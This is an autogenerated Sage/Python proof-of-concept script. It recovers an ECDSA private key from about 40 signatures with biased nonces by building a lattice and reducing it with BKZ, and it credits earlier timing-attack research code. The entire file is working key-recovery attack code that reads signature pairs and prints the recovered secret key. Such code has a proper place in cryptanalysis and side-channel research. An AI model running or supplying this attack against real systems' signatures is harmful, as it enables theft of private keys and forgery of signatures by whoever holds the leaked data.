
# This file was *autogenerated* from the file attack.sage
from sage.all_cmdline import *   # import sage library

_sage_const_40 = Integer(40); _sage_const_2 = Integer(2); _sage_const_1 = Integer(1); _sage_const_0 = Integer(0); _sage_const_256 = Integer(256); _sage_const_8 = Integer(8); _sage_const_0xb39eaeb437e33087132f01c2abc60c6a16904ee3771cd7b0d622d01061b40729 = Integer(0xb39eaeb437e33087132f01c2abc60c6a16904ee3771cd7b0d622d01061b40729); _sage_const_16 = Integer(16); _sage_const_30 = Integer(30)# Recovers ECDSA key using LLL assuming samples with biased nonces
# Based on David Wong's code at
# https://github.com/mimoo/timing_attack_ecdsa_tls/blob/master/PoC/attack_clean.sage
# Note: 
#       We are sharing attack.sage since it's easier to use
#       Lattice formulation in attack2.sage (bsaed on Nadia Heninger's code) is more 
#       powerful and was able to recover the key while attack.sage did not



# Change configuration parameters 
known_bits = _sage_const_8 
MAX_SIG = _sage_const_40 


trick = _sage_const_2 **_sage_const_256  / _sage_const_2 **(known_bits+_sage_const_1 )

digests = []
signatures = []



i = _sage_const_0 

with open("sigpairs.txt", "r") as f:
    for line in f:
        a = line.split()
        t = tuple([int(x,_sage_const_16 ) for x in a])
        signatures.append(t)
        i = i+_sage_const_1 
        if i==MAX_SIG:
            break

print('Trying with %d signatures..' % len(signatures))
# Parse it

digest = _sage_const_0xb39eaeb437e33087132f01c2abc60c6a16904ee3771cd7b0d622d01061b40729 
for i in range(len(signatures)):
    digests.append(digest)

# and public key modulo
# taken from NIST or FIPS (http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf)
modulo = 115792089210356248762697446949407573529996955224135760342422259061068512044369L
# Building Equations
nn = len(digests)

# getting rid of the first equation
r0_inv = inverse_mod(signatures[_sage_const_0 ][_sage_const_0 ], modulo)
s0 = signatures[_sage_const_0 ][_sage_const_1 ]
m0 = digests[_sage_const_0 ]

AA = [-_sage_const_1 ]
BB = [_sage_const_0 ]

for ii in range(_sage_const_1 , nn):
    mm = digests[ii]
    rr = signatures[ii][_sage_const_0 ]
    ss = signatures[ii][_sage_const_1 ]
    ss_inv = inverse_mod(ss, modulo)

    AA_i = Mod(-_sage_const_1  * s0 * r0_inv * rr * ss_inv, modulo)
    BB_i = Mod(-_sage_const_1  * mm * ss_inv + m0 * r0_inv * rr * ss_inv, modulo)
    AA.append(AA_i.lift())
    BB.append(BB_i.lift())

# Embedding Technique (CVP->SVP)
lattice = Matrix(ZZ, nn + _sage_const_1 )

# Fill lattice
for ii in range(nn):
    lattice[ii, ii] = modulo
    lattice[_sage_const_0 , ii] = AA[ii]

BB.append(trick)
lattice[nn] = vector(BB)

# LLL
lattice = lattice.BKZ(blocksize=_sage_const_30 ) # should get better results with BKZ instead of LLL

# If a solution is found, format it
if lattice[_sage_const_0 ,-_sage_const_1 ] % modulo == trick:
    # get rid of (..., 1)
    vec = list(lattice[_sage_const_0 ])
    vec.pop()
    vec = vector(vec)
    solution = -_sage_const_1  * vec

    # get d
    rr = signatures[_sage_const_0 ][_sage_const_0 ]
    ss = signatures[_sage_const_0 ][_sage_const_1 ]
    mm = digests[_sage_const_0 ]
    nonce = solution[_sage_const_0 ]

    key = Mod((ss * nonce - mm) * inverse_mod(rr, modulo), modulo)

    print "found a key"
    print key

